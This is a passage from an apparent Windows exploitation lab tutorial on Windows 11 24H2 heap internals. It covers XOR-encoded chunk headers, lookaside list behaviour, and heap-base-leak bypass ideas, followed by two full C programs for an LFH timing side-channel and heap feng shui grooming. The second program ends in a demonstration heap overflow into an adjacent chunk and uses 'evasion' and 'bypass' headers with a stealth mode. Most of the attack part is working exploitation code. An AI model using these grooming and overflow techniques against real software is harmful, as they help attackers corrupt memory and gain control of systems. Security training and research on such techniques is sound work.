┌─────────────────────────────────────────────────────────────┐
│  Segment Backend                                            │
│  - Large allocations                                        │
│  - Direct segment allocation                                │
│  - Virtual memory backed                                    │
└─────────────────────────────────────────────────────────────┘
```

#### Heap Base XOR Encoding

Windows 11 24H2 uses XOR encoding to protect chunk metadata:

```c
// Decoding VS chunk header (conceptual)
PVOID DecodeChunkHeader(PHEAP_VS_CHUNK_HEADER header, PVOID heap_base) {
    ULONG_PTR decoded_cost = header->MemoryCost ^ (ULONG_PTR)heap_base;
    USHORT decoded_size = header->UnsafeSize ^ (USHORT)((ULONG_PTR)heap_base & 0xFFFF);

    printf("Decoded MemoryCost: 0x%llx\n", decoded_cost);
    printf("Decoded Size: 0x%x\n", decoded_size);

    return (PVOID)decoded_cost;
}

// Encoding for exploitation (requires heap base leak)
VOID EncodeChunkHeader(PHEAP_VS_CHUNK_HEADER header, ULONG_PTR new_size, PVOID heap_base) {
    header->UnsafeSize = (USHORT)new_size ^ (USHORT)((ULONG_PTR)heap_base & 0xFFFF);
    // MemoryCost encoding is more complex - requires understanding allocation patterns
}
```

#### Exploitation Implications

The encoded chunk headers create new challenges:

1. **Header Corruption**: Cannot simply overwrite chunk headers with arbitrary values
2. **Heap Base Requirement**: Must leak heap base to decode/encode metadata
3. **Integrity Checks**: VS subsegment has integrity validation
4. **Pool Header Validation**: Pool headers are validated during operations

**Bypass Techniques**:

1. Technique 1: Heap base leak via NtQuerySystemInformation (Requires SeDebugPrivilege on Windows 11 24H2)
2. Technique 2: Partial overwrite (avoid header corruption)

#### Dynamic Lookaside Lists

Windows 11 24H2 replaces static freelists with dynamic lookaside lists:

```c
// Lookaside list behavior
// - Allocations are cached per-CPU
// - Lookaside lists are not randomized
// - Can be used for predictable allocation patterns

VOID ExploitLookaside(HANDLE hHeap, DWORD allocSize) {
    // Step 1: Fill lookaside list
    PVOID lookaside[256];
    for (int i = 0; i < 256; i++) {
        lookaside[i] = HeapAlloc(hHeap, 0, allocSize);
    }

    // Step 2: Free to lookaside (LIFO order)
    for (int i = 0; i < 256; i++) {
        HeapFree(hHeap, 0, lookaside[i]);
    }

    // Step 3: Reallocate - will get from lookaside in reverse order
    // This provides predictable allocation ordering
    PVOID predictable = HeapAlloc(hHeap, 0, allocSize);
    // predictable == lookaside[255] (LIFO)
}
```

### LFH Timing Side-Channel

Windows Low Fragmentation Heap (LFH) uses randomized bucket placement, but allocation timing reveals internal state through cache effects. The technique detects heap type (Segment Heap vs Legacy LFH) by measuring pre/post-activation timing and allocation scatter patterns. After triggering LFH with 18 consecutive same-size allocations, the grooming process: (1) spray with timing analysis to detect subsegment boundaries (5x average threshold), (2) free ALL allocations for bucket alignment, (3) reallocate with every-other pattern creating holes, (4) refill holes achieving physical adjacency. Testing shows addresses randomized in array order but physical adjacency analysis (checking within 20-allocation window, max distance allocation_size + 0x30) reveals exploitable neighbors. The tool provides adjacency assessment: >40% = viable spray+overflow, 25-40% = probabilistic exploitation, <25% = recommend UAF or heap leak approaches.

```c
// lfh_timing_sidechannel.c
// Compile: cl src\lfh_timing_sidechannel.c /Fe:bin\lfh_timing.exe /O2 /I.\headers

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "heap_utils.h"
#include <stdio.h>
#include <intrin.h>
#include <winternl.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

typedef struct _LFH_ANALYSIS_CONFIG {
    DWORD allocationSize;
    DWORD sprayCount;
    DWORD anomalyThreshold;
    BOOL enableStatisticalAnalysis;
} LFH_ANALYSIS_CONFIG;

typedef struct _LFH_ANALYSIS_RESULT {
    DWORD64 avgTiming;
    DWORD64 variance;
    DWORD64 preTiming;
    DWORD64 postTiming;
    DWORD anomalyCount;
    DWORD adjacentPairs;
    DWORD successRate;
    BOOL heapActivated;
    BOOL segmentHeap;
} LFH_ANALYSIS_RESULT;

static BOOL DetectHeapType(HANDLE hHeap, DWORD allocSize, LFH_ANALYSIS_RESULT* result) {
    // Measure baseline timing
    result->preTiming = MeasureAllocationTiming(hHeap, allocSize, 50);

    // Trigger LFH activation: 18+ consecutive allocs of same size
    PVOID trigger[20];
    for (int i = 0; i < 18; i++)
        trigger[i] = HeapAlloc(hHeap, 0, allocSize);

    result->postTiming = MeasureAllocationTiming(hHeap, allocSize, 50);

    // Detect segment heap via allocation pattern
    MEMORY_BASIC_INFORMATION mbi;
    result->segmentHeap = FALSE;
    if (trigger[0] && VirtualQuery(trigger[0], &mbi, sizeof(mbi))) {
        // Segment heap allocations come from different regions
        // Check if allocations are scattered (segment heap) vs contiguous (LFH)
        LONG_PTR spread = 0;
        for (int i = 1; i < 18 && trigger[i]; i++) {
            LONG_PTR diff = (LONG_PTR)trigger[i] - (LONG_PTR)trigger[i-1];
            if (diff < 0) diff = -diff;
            if (diff > 0x10000) spread++;
        }
        result->segmentHeap = (spread > 5);
    }

    // Heap is "activated" if timing changed OR we got valid allocations
    DWORD64 delta = (result->postTiming > result->preTiming) ?
                    (result->postTiming - result->preTiming) :
                    (result->preTiming - result->postTiming);
    result->heapActivated = (result->preTiming > 0 && result->postTiming > 0);

    for (int i = 0; i < 18; i++)
        if (trigger[i]) HeapFree(hHeap, 0, trigger[i]);

    printf("[+] Heap type: %s\n", result->segmentHeap ? "Segment Heap" : "Legacy LFH");
    printf("[+] Pre-activation:  %llu cycles\n", result->preTiming);
    printf("[+] Post-activation: %llu cycles\n", result->postTiming);
    printf("[+] Delta: %llu cycles (%.1f%%)\n", delta,
           result->preTiming > 0 ? (delta * 100.0) / result->preTiming : 0.0);

    return result->heapActivated;
}

static BOOL PerformHeapGrooming(HANDLE hHeap, LFH_ANALYSIS_CONFIG* config,
                                LFH_ANALYSIS_RESULT* result) {
    printf("\n[*] Heap grooming (%d allocs, 0x%X bytes each)\n",
           config->sprayCount, config->allocationSize);

    PVOID* allocs = (PVOID*)malloc(config->sprayCount * sizeof(PVOID));
    DWORD64* timings = (DWORD64*)malloc(config->sprayCount * sizeof(DWORD64));
    if (!allocs || !timings) {
        free(allocs); free(timings);
        return FALSE;
    }

    // Phase 1: Spray with timing
    for (DWORD i = 0; i < config->sprayCount; i++) {
        _mm_lfence();
        DWORD64 start = __rdtsc();
        allocs[i] = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, config->allocationSize);
        _mm_lfence();
        timings[i] = __rdtsc() - start;
        if (allocs[i]) memset(allocs[i], 0x41, config->allocationSize);
    }

    // Statistical analysis
    if (config->enableStatisticalAnalysis) {
        DWORD64 sum = 0;
        for (DWORD i = 0; i < config->sprayCount; i++) sum += timings[i];
        result->avgTiming = sum / config->sprayCount;

        DWORD64 varSum = 0;
        for (DWORD i = 0; i < config->sprayCount; i++) {
            DWORD64 d = (timings[i] > result->avgTiming) ?
                        (timings[i] - result->avgTiming) :
                        (result->avgTiming - timings[i]);
            varSum += d * d;
        }
        result->variance = varSum / config->sprayCount;

        result->anomalyCount = 0;
        DWORD64 threshold = result->avgTiming * config->anomalyThreshold;
        for (DWORD i = 0; i < config->sprayCount; i++)
            if (timings[i] > threshold) result->anomalyCount++;

        printf("[+] Avg: %llu cycles, variance: %llu, anomalies: %d\n",
               result->avgTiming, result->variance, result->anomalyCount);
    }

    // Phase 2: Free all
    for (DWORD i = 0; i < config->sprayCount; i++) {
        if (allocs[i]) { HeapFree(hHeap, 0, allocs[i]); allocs[i] = NULL; }
    }

    // Phase 3: Alternate alloc/hole pattern
    DWORD allocCount = 0, holeCount = 0;
    for (DWORD i = 0; i < config->sprayCount; i++) {
        if (i % 2 == 0) {
            allocs[i] = HeapAlloc(hHeap, 0, config->allocationSize);
            if (allocs[i]) { memset(allocs[i], 0x41, config->allocationSize); allocCount++; }
        } else {
            allocs[i] = NULL;
            holeCount++;
        }
    }

    // Phase 4: Refill holes
    DWORD refills = 0;
    for (DWORD i = 0; i < config->sprayCount; i++) {
        if (!allocs[i]) {
            allocs[i] = HeapAlloc(hHeap, 0, config->allocationSize);
            if (allocs[i]) { memset(allocs[i], 0x42, config->allocationSize); refills++; }
        }
    }

    // Measure adjacency
    DWORD seqAdj = 0, totalPairs = 0, physAdj = 0;
    for (DWORD i = 0; i < config->sprayCount - 1; i++) {
        if (allocs[i] && allocs[i+1]) {
            totalPairs++;
            LONG_PTR diff = (LONG_PTR)allocs[i+1] - (LONG_PTR)allocs[i];
            if (diff > 0 && diff <= (LONG_PTR)(config->allocationSize + 0x30))
                seqAdj++;
        }
    }
    for (DWORD i = 0; i < config->sprayCount; i++) {
        if (!allocs[i]) continue;
        for (DWORD j = i + 1; j < config->sprayCount && j < i + 20; j++) {
            if (!allocs[j]) continue;
            LONG_PTR diff = (LONG_PTR)allocs[j] - (LONG_PTR)allocs[i];
            if (diff > 0 && diff <= (LONG_PTR)(config->allocationSize + 0x30)) {
                physAdj++;
                break;
            }
        }
    }

    result->adjacentPairs = physAdj;
    result->successRate = holeCount > 0 ? (refills * 100) / holeCount : 0;

    printf("[+] Layout: %d allocs, %d holes, %d refills (%d%%)\n",
           allocCount, holeCount, refills, result->successRate);
    printf("[+] Sequential adjacency: %d/%d (%.1f%%)\n",
           seqAdj, totalPairs, totalPairs > 0 ? (seqAdj * 100.0) / totalPairs : 0.0);
    printf("[+] Physical adjacency: %d (%.1f%%)\n",
           physAdj, (physAdj * 100.0) / config->sprayCount);

    // Show first 10 addresses
    printf("[*] Sample addresses:\n");
    int shown = 0;
    for (DWORD i = 0; shown < 10 && i < config->sprayCount; i++) {
        if (allocs[i]) {
            printf("    [%d] %p\n", i, allocs[i]);
            shown++;
        }
    }

    for (DWORD i = 0; i < config->sprayCount; i++)
        if (allocs[i]) HeapFree(hHeap, 0, allocs[i]);
    free(allocs);
    free(timings);
    return TRUE;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("=== LFH Timing Side-Channel ===\n\n");

    SYSTEM_INFO si; GetSystemInfo(&si);
    MEMORYSTATUSEX ms = { .dwLength = sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    DWORD64 availMB = ms.ullAvailPhys / (1024 * 1024);

    LFH_ANALYSIS_CONFIG config = {
        .allocationSize = 0x200,
        .anomalyThreshold = 5,
        .enableStatisticalAnalysis = TRUE,
        .sprayCount = (availMB > 4096) ? 2000 : (availMB > 2048) ? 1000 : 500
    };

    printf("[*] %d cores, %llu MB RAM, spray: %d x 0x%X\n",
           si.dwNumberOfProcessors, availMB, config.sprayCount, config.allocationSize);

    SetExploitPriority(1);
    HANDLE hHeap = GetProcessHeap();
    LFH_ANALYSIS_RESULT result = {0};

    printf("\n[*] Detecting heap type...\n");
    if (!DetectHeapType(hHeap, config.allocationSize, &result)) {
        printf("[-] Heap detection failed\n");
        return 1;
    }

    if (!PerformHeapGrooming(hHeap, &config, &result)) {
        printf("[-] Grooming failed\n");
        return 1;
    }

    float adjRate = (result.adjacentPairs * 100.0f) / config.sprayCount;
    printf("\n[*] Assessment:\n");
    if (adjRate > 40.0f) {
        printf("[+] Physical adjacency %.1f%% - spray + overflow viable\n", adjRate);
    } else if (result.adjacentPairs > 0) {
        printf("[~] Partial adjacency %.1f%% - probabilistic exploitation\n", adjRate);
    } else {
        printf("[-] No adjacency - strong heap randomization\n");
        printf("    Use UAF or heap leak + targeted allocation\n");
    }
    return 0;
}
```

**Compile & Run:**

```bash
cd c:\Windows_Mitigations_Lab
cl src\lfh_timing_sidechannel.c /Fe:bin\lfh_timing.exe /O2 /I.\headers
.\bin\lfh_timing.exe
```

### Heap Feng Shui

Heap feng shui arranges heap layout through precise allocation/deallocation patterns to place attacker-controlled data adjacent to vulnerable buffers. The implementation uses adaptive spray counts based on available memory (500-2000 allocations) with 0x200 byte target size for optimal LFH bucket behavior. The four-phase technique: (1) exhaustive spray with timing analysis (5x threshold for boundary detection), (2) bucket alignment by freeing ALL allocations to reset LFH state, (3) every-other pattern creating controlled holes, (4) refill holes with controlled data (0x42 marker + fake headers). Adjacency verification uses two metrics: sequential (consecutive array indices within allocation_size + 0x40) and physical (any allocation within 20-index window). The tool scores each allocation (0-100 based on distance quality) and provides exploitation assessment. Real heap overflow demonstration: identifies best adjacent pair, crafts payload with padding + fake object, triggers VulnerableFunction overflow, verifies corruption by checking marker bytes.

```c
// heap_feng_shui.c
// Heap grooming with timing feedback and statistical analysis
// Compile: cl src\heap_feng_shui.c /Fe:bin\heap_feng_shui.exe /O2 /I.\headers

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "heap_utils.h"
#include <stdio.h>
#include <intrin.h>
#include <winternl.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

typedef struct _HEAP_GROOMING_CONFIG {
    DWORD targetSize;
    DWORD sprayCount;
    DWORD holePattern;
    DWORD timingThreshold;
    BOOL enableStatisticalAnalysis;
    BOOL enableAdaptivePatterns;
    BOOL enableStealthMode;
} HEAP_GROOMING_CONFIG, *PHEAP_GROOMING_CONFIG;

typedef struct _HEAP_GROOMING_RESULT {
    DWORD64 avgTiming;
    DWORD64 timingVariance;
    DWORD slabBoundaries;
    DWORD adjacentPairs;
    DWORD successRate;
    DWORD holesCreated;
    DWORD holesRefilled;
    DWORD recommendedPattern;
    BOOL lfhActivated;
    BOOL segmentHeapActive;
} HEAP_GROOMING_RESULT, *PHEAP_GROOMING_RESULT;

typedef struct _SPRAY_OBJECT {
    PVOID   address;
    UINT64  allocTime;
    UINT64  freeTime;
    DWORD   marker;
    DWORD   sequence;
    BOOL    isHole;
    DWORD   adjacencyScore;
} SPRAY_OBJECT, *PSPRAY_OBJECT;

static BOOL AnalyzeLFHActivationInExploit(HANDLE hHeap, DWORD allocSize, PHEAP_GROOMING_RESULT result) {
    printf("[*] Analyzing LFH activation for 0x%X byte allocations...\n", allocSize);
    result->lfhActivated = AnalyzeLFHActivation(hHeap, allocSize);
    result->segmentHeapActive = AnalyzeSegmentHeap(NULL);
    printf("    LFH activated: %s\n", result->lfhActivated ? "YES" : "NO");
    printf("    Segment heap: %s\n", result->segmentHeapActive ? "YES" : "NO");
    return result->lfhActivated;
}

static BOOL PerformExhaustiveSpray(HANDLE hHeap, PHEAP_GROOMING_CONFIG config,
                                PSPRAY_OBJECT sprayArray, PHEAP_GROOMING_RESULT result) {
    printf("[*] Phase 1: Exhaustive spray with timing analysis...\n");
    DWORD allocated = 0;
    DWORD64 totalTime = 0;
    DWORD anomalyThreshold = 5;
    for (DWORD i = 0; i < config->sprayCount; i++) {
        _mm_lfence();
        DWORD64 start = __rdtsc();
        sprayArray[i].address = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, config->targetSize);
        _mm_lfence();
        DWORD64 end = __rdtsc();
        if (!sprayArray[i].address) break;
        sprayArray[i].allocTime = end - start;
        sprayArray[i].marker = 0x41414141 + i;
        sprayArray[i].sequence = i;
        sprayArray[i].isHole = FALSE;
        sprayArray[i].adjacencyScore = 0;
        totalTime += sprayArray[i].allocTime;
        allocated++;
        memset(sprayArray[i].address, (BYTE)(i & 0xFF), config->targetSize);
        if (config->enableStealthMode && (i % 50) == 0) {
            SleepJitter(2);
        }
    }
    if (config->enableStatisticalAnalysis && allocated > 0) {
        result->avgTiming = totalTime / allocated;
        DWORD64 varianceSum = 0;
        for (DWORD i = 0; i < allocated; i++) {
            DWORD64 diff = (sprayArray[i].allocTime > result->avgTiming) ?
                           (sprayArray[i].allocTime - result->avgTiming) :
                           (result->avgTiming - sprayArray[i].allocTime);
            varianceSum += diff * diff;
        }
        result->timingVariance = varianceSum / allocated;
        DWORD64 boundaryThreshold = result->avgTiming * anomalyThreshold;
        for (DWORD i = 0; i < allocated; i++) {
            if (sprayArray[i].allocTime > boundaryThreshold) {
                result->slabBoundaries++;
            }
        }
        printf("    Average timing: %llu cycles\n", result->avgTiming);
        printf("    Timing variance: %llu\n", result->timingVariance);
        printf("    Subsegment boundaries detected: %d\n", result->slabBoundaries);
    }
    printf("[+] Sprayed %d objects\n", allocated);
    return allocated > 0;
}

static DWORD CreateControlledHoles(HANDLE hHeap, PHEAP_GROOMING_CONFIG config,
                                  PSPRAY_OBJECT sprayArray, DWORD sprayCount,
                                  PHEAP_GROOMING_RESULT result) {
    printf("[*] Phase 2: Bucket alignment - freeing all to reset LFH state...\n");
    for (DWORD i = 0; i < sprayCount; i++) {
        if (sprayArray[i].address) {
            HeapFree(hHeap, 0, sprayArray[i].address);
            sprayArray[i].address = NULL;
            sprayArray[i].isHole = TRUE;
        }
    }
    printf("[*] Phase 3: Creating controlled layout with hole pattern...\n");
    DWORD allocCount = 0;
    DWORD holeCount = 0;
    for (DWORD i = 0; i < sprayCount; i++) {
        if (i % 2 == 0) {
            // Allocate
            sprayArray[i].address = HeapAlloc(hHeap, 0, config->targetSize);
            if (sprayArray[i].address) {
                memset(sprayArray[i].address, 0x41, config->targetSize);
                sprayArray[i].isHole = FALSE;
                allocCount++;
            }
        } else {
            // Leave hole
            sprayArray[i].address = NULL;
            sprayArray[i].isHole = TRUE;
            holeCount++;
        }
    }
    result->holesCreated = holeCount;
    result->recommendedPattern = 2; // Every-other pattern
    printf("[+] Created layout: %d allocations, %d holes (%.1f%% holes)\n",
           allocCount, holeCount, (holeCount * 100.0) / sprayCount);
    return holeCount;
}

static DWORD VerifyObjectAdjacency(PSPRAY_OBJECT sprayArray, DWORD sprayCount,
                                  PHEAP_GROOMING_CONFIG config,
                                  PHEAP_GROOMING_RESULT result) {
    printf("[*] Phase 5: Verifying object adjacency with scoring...\n");
    DWORD sequentialAdjacent = 0;
    DWORD physicallyAdjacent = 0;
    DWORD totalPairs = 0;
    DWORD maxDistance = config->targetSize + 0x40;
    printf("    Analyzing heap layout (first 10 allocations):\n");
    for (DWORD i = 0; i < 10 && i < sprayCount; i++) {
        if (sprayArray[i].address) {
            printf("      [%d] = %p\n", i, sprayArray[i].address);
        }
    }
    for (DWORD i = 1; i < sprayCount; i++) {
        if (!sprayArray[i].address || !sprayArray[i-1].address) continue;
        totalPairs++;
        LONG_PTR distance = (LONG_PTR)sprayArray[i].address -
                           (LONG_PTR)sprayArray[i-1].address;
        if (distance > 0 && distance <= maxDistance) {
            sequentialAdjacent++;
            DWORD qualityScore = 100;
            if (distance > config->targetSize) {
                qualityScore -= ((distance - config->targetSize) * 100) / maxDistance;
            }

            sprayArray[i].adjacencyScore = qualityScore;
            sprayArray[i-1].adjacencyScore = qualityScore;
        }
    }
    for (DWORD i = 0; i < sprayCount; i++) {
        if (!sprayArray[i].address) continue;
        BOOL foundAdjacent = FALSE;
        DWORD bestScore = 0;
        for (DWORD j = i + 1; j < sprayCount && j < i + 20; j++) {
            if (!sprayArray[j].address) continue;
            LONG_PTR diff = (LONG_PTR)sprayArray[j].address - (LONG_PTR)sprayArray[i].address;
            if (diff > 0 && diff <= maxDistance) {
                foundAdjacent = TRUE;
                DWORD qualityScore = 100;
                if (diff > config->targetSize) {
                    qualityScore -= ((diff - config->targetSize) * 100) / maxDistance;
                }
                if (qualityScore > bestScore) {
                    bestScore = qualityScore;
                }
            }
        }
        if (foundAdjacent) {
            physicallyAdjacent++;
            if (bestScore > sprayArray[i].adjacencyScore) {
                sprayArray[i].adjacencyScore = bestScore;
            }
        }
    }
    result->adjacentPairs = physicallyAdjacent;
    float physicalRate = (physicallyAdjacent * 100.0) / sprayCount;
    float sequentialRate = totalPairs > 0 ? (sequentialAdjacent * 100.0) / totalPairs : 0.0;
    printf("    Sequential adjacency: %d/%d (%.1f%%)\n",
           sequentialAdjacent, totalPairs, sequentialRate);
    printf("    Physical adjacency: %d allocations have neighbors (%.1f%%)\n",
           physicallyAdjacent, physicalRate);
    if (physicalRate > 45.0) {
        printf("[+] EXCELLENT - Good physical adjacency for exploitation\n");
        printf("    [*] ~%.1f%% chance of hitting adjacent object on overflow\n", physicalRate);
        result->successRate = (DWORD)physicalRate;
    } else if (physicalRate > 30.0) {
        printf("[+] GOOD - Acceptable physical adjacency\n");
        result->successRate = (DWORD)physicalRate;
    } else if (physicalRate > 15.0) {
        printf("[*] MODERATE - Consider larger spray\n");
        result->successRate = (DWORD)physicalRate;
    } else {
        printf("[-] POOR - Low adjacency, recommend alternative approach\n");
        result->successRate = (DWORD)physicalRate;
    }
    return physicallyAdjacent;
}

static DWORD RefillControlledHoles(HANDLE hHeap, PHEAP_GROOMING_CONFIG config,
                                   PSPRAY_OBJECT sprayArray, DWORD sprayCount,
                                   PHEAP_GROOMING_RESULT result) {
    printf("[*] Phase 4: Refilling holes with controlled data...\n");
    DWORD holesRefilled = 0;
    for (DWORD i = 0; i < sprayCount; i++) {
        if (sprayArray[i].isHole && !sprayArray[i].address) {
            sprayArray[i].address = HeapAlloc(hHeap, 0, config->targetSize);
            if (sprayArray[i].address) {
                memset(sprayArray[i].address, 0x42, config->targetSize);
                if (config->targetSize >= sizeof(DWORD) * 4) {
                    PDWORD header = (PDWORD)sprayArray[i].address;
                    header[0] = 0x42424242; // Controlled marker
                    header[1] = sprayArray[i].sequence; // Sequence ID
                    header[2] = 0xDEADBEEF; // Magic value
                    header[3] = (DWORD)((ULONG_PTR)sprayArray[i].address & 0xFFFFFFFF); // Address hint
                }
                sprayArray[i].isHole = FALSE;
                holesRefilled++;
                if (config->enableStealthMode && (holesRefilled % 50) == 0) {
                    SleepJitter(1);
                }
            }
        }
    }
    result->holesRefilled = holesRefilled;
    printf("[+] Refilled %d holes with controlled data\n", holesRefilled);
    return holesRefilled;
}

static VOID CleanupSprayObjects(HANDLE hHeap, PSPRAY_OBJECT sprayArray, DWORD sprayCount) {
    printf("[*] Cleaning up spray objects...\n");

    DWORD cleaned = 0;
    for (DWORD i = 0; i < sprayCount; i++) {
        if (sprayArray[i].address) {
            HeapFree(hHeap, 0, sprayArray[i].address);
            sprayArray[i].address = NULL;
            cleaned++;
        }
    }

    printf("[+] Cleaned up %d objects\n", cleaned);
}

static BOOL HeapOverflowExploit(HANDLE hHeap, PSPRAY_OBJECT sprayArray,
                                        DWORD sprayCount, PHEAP_GROOMING_CONFIG config,
                                        PHEAP_GROOMING_RESULT result) {
    printf("\n[*] Phase 6: Heap overflow exploitation...\n");

    if (result->successRate < 30) {
        printf("[-] Success rate too low for reliable exploitation\n");
        return FALSE;
    }
    DWORD targetIndex = 0;
    DWORD maxScore = 0;
    for (DWORD i = 0; i < sprayCount; i++) {
        if (sprayArray[i].address && sprayArray[i].adjacencyScore > maxScore) {
            maxScore = sprayArray[i].adjacencyScore;
            targetIndex = i;
        }
    }
    if (maxScore == 0) {
        printf("[-] No suitable target found with adjacency\n");
        return FALSE;
    }

    // Find the allocation that sits RIGHT BEFORE the target in memory
    DWORD overflowIndex = 0;
    BOOL foundAdjacent = FALSE;
    LONG_PTR minDistance = LONG_MAX;
    for (DWORD i = 0; i < sprayCount; i++) {
        if (i == targetIndex || !sprayArray[i].address) continue;
        // source must be BEFORE target: target - source > 0
        LONG_PTR diff = (LONG_PTR)sprayArray[targetIndex].address - (LONG_PTR)sprayArray[i].address;
        if (diff > 0 && diff <= (LONG_PTR)(config->targetSize + 0x40) && diff < minDistance) {
            overflowIndex = i;
            minDistance = diff;
            foundAdjacent = TRUE;
        }
    }
    if (!foundAdjacent) {
        printf("[-] No adjacent allocation found for overflow source\n");
        return FALSE;
    }

    PVOID source = sprayArray[overflowIndex].address;
    PVOID target = sprayArray[targetIndex].address;

    printf("    Overflow source [%d]: %p\n", overflowIndex, source);
    printf("    Overflow target [%d]: %p\n", targetIndex, target);
    printf("    Distance: 0x%llX bytes\n", (DWORD64)minDistance);

    // Save original target content before corruption
    BYTE savedTarget[32];
    memcpy(savedTarget, target, sizeof(savedTarget));

    printf("    Target before overflow: %02X %02X %02X %02X %02X %02X %02X %02X\n",
           ((BYTE*)target)[0], ((BYTE*)target)[1], ((BYTE*)target)[2], ((BYTE*)target)[3],
           ((BYTE*)target)[4], ((BYTE*)target)[5], ((BYTE*)target)[6], ((BYTE*)target)[7]);

    // REAL OVERFLOW: write past source allocation boundary into target
    // Fill source with 0xCC, then overflow into target with 0xDD
    DWORD overflowBytes = 16;  // how far past boundary we write
    DWORD totalWrite = (DWORD)minDistance + overflowBytes;

    printf("    Writing %d bytes from source (0x%X source + %d overflow)\n",
           totalWrite, (DWORD)minDistance, overflowBytes);

    // This is the actual heap overflow — writes past source allocation boundary
    __try {
        memset(source, 0xCC, (SIZE_T)minDistance);     // fill source up to boundary
        memset((BYTE*)source + minDistance, 0xDD, overflowBytes);  // overflow into target
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Overflow caused exception (heap guard page)\n");
        return FALSE;
    }

    // Verify the corruption hit the target
    BOOL corrupted = (((BYTE*)target)[0] == 0xDD);

    printf("    Target after overflow:  %02X %02X %02X %02X %02X %02X %02X %02X\n",
           ((BYTE*)target)[0], ((BYTE*)target)[1], ((BYTE*)target)[2], ((BYTE*)target)[3],
           ((BYTE*)target)[4], ((BYTE*)target)[5], ((BYTE*)target)[6], ((BYTE*)target)[7]);

    if (corrupted) {
        printf("[+] Heap overflow VERIFIED - target corrupted with 0xDD\n");
        printf("[+] Adjacency score: %d/100, distance: 0x%llX\n", maxScore, (DWORD64)minDistance);
    } else {
        printf("[-] Target not corrupted (heap metadata or guard between allocations)\n");
    }

    // Restore target for clean heap state
    memcpy(target, savedTarget, sizeof(savedTarget));

    return corrupted;
}

static BOOL ConfigureHeapGrooming(PHEAP_GROOMING_CONFIG config) {
    DWORD cpuCount = GetCPUCount();
    DWORD availMB = GetSystemMemoryMB();
    config->targetSize = 0x200; // 512 bytes - optimal LFH bucket
    config->holePattern = 2; // Every-other pattern (best for Windows 11)
    config->timingThreshold = 5; // 5x average timing (reduced false positives)
    config->enableStatisticalAnalysis = TRUE;
    config->enableAdaptivePatterns = FALSE; // Disabled - every-other is optimal
    config->enableStealthMode = TRUE;
    if (availMB > 8192) {
        config->sprayCount = 5000; // High-memory systems
    } else if (availMB > 4096) {
        config->sprayCount = 3000; // Medium-high memory
    } else if (availMB > 2048) {
        config->sprayCount = 2000; // Medium memory
    } else {
        config->sprayCount = 1000; // Low-memory systems
    }
    printf("[*] System configuration:\n");
    printf("    CPU cores: %d\n", cpuCount);
    printf("    Available memory: %u MB\n", availMB);
    printf("    Spray count: %d objects\n", config->sprayCount);
    printf("    Target size: 0x%X bytes\n", config->targetSize);
    printf("    Strategy: Bucket filling with every-other pattern\n");
    return TRUE;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("=== Heap Feng Shui Analysis ===\n");
    HEAP_GROOMING_CONFIG config = {0};
    if (!ConfigureHeapGrooming(&config)) {
        printf("[-] Failed to configure heap grooming\n");
        return 1;
    }
    SetExploitPriority(1);
    HANDLE hHeap = GetProcessHeap();
    HEAP_GROOMING_RESULT result = {0};
    printf("\n[*] Starting advanced heap grooming analysis...\n");
    if (!AnalyzeLFHActivationInExploit(hHeap, config.targetSize, &result)) {
        printf("[-] LFH activation analysis failed\n");
        return 1;
    }
    if (!result.lfhActivated) {
        printf("[-] LFH not activated - heap grooming ineffective\n");
        return 1;
    }
    PSPRAY_OBJECT sprayArray = (PSPRAY_OBJECT)malloc(config.sprayCount * sizeof(SPRAY_OBJECT));
    if (!sprayArray) {
        printf("[-] Failed to allocate spray array\n");
        return 1;
    }
    memset(sprayArray, 0, config.sprayCount * sizeof(SPRAY_OBJECT));
    if (!PerformExhaustiveSpray(hHeap, &config, sprayArray, &result)) {
        printf("[-] Heap spray failed\n");
        free(sprayArray);
        return 1;
    }
    if (CreateControlledHoles(hHeap, &config, sprayArray, config.sprayCount, &result) == 0) {
        printf("[-] Hole creation failed\n");
        CleanupSprayObjects(hHeap, sprayArray, config.sprayCount);
        free(sprayArray);
        return 1;
    }
    if (RefillControlledHoles(hHeap, &config, sprayArray, config.sprayCount, &result) == 0) {
        printf("[-] Hole refilling failed\n");
        CleanupSprayObjects(hHeap, sprayArray, config.sprayCount);
        free(sprayArray);
        return 1;
    }
    VerifyObjectAdjacency(sprayArray, config.sprayCount, &config, &result);
    printf("\n[*] Summary:\n");
    printf("    LFH activated: %s\n", result.lfhActivated ? "YES" : "NO");
    printf("    Segment heap: %s\n", result.segmentHeapActive ? "YES" : "NO");
    printf("    Subsegment boundaries: %d\n", result.slabBoundaries);
    printf("    Physical adjacency: %d allocations (%.1f%%)\n",
           result.adjacentPairs, (result.adjacentPairs * 100.0) / config.sprayCount);
    printf("    Exploitation success rate: ~%d%%\n", result.successRate);
    if (result.successRate > 40) {
        printf("\n[+] Heap feng shui successful - suitable for exploitation\n");
        printf("    [*] Strategy: Spray vulnerable objects, trigger overflow\n");
        printf("    [*] Expected success: ~%d%% chance of adjacent corruption\n", result.successRate);
       if (HeapOverflowExploit(hHeap, sprayArray, config.sprayCount, &config, &result)) {
            printf("\n[+] Exploitation demonstration completed successfully\n");
        } else {
            printf("\n[*] Exploitation demonstration shows realistic challenges\n");
            printf("    [*] In practice: would retry or use information leak\n");
        }
    } else {
        printf("\n[-] Low adjacency - consider alternative approach\n");
        printf("    [*] Recommendations:\n");
        printf("        - Increase spray count (current: %d)\n", config.sprayCount);
        printf("        - Use heap address leak for targeted allocation\n");
        printf("        - Consider use-after-free instead of overflow\n");
    }
    CleanupSprayObjects(hHeap, sprayArray, config.sprayCount);
    free(sprayArray);
    printf("\n[+] Heap feng shui analysis completed\n");
    return 0;
}
```

**Compile & Run:**

```bash
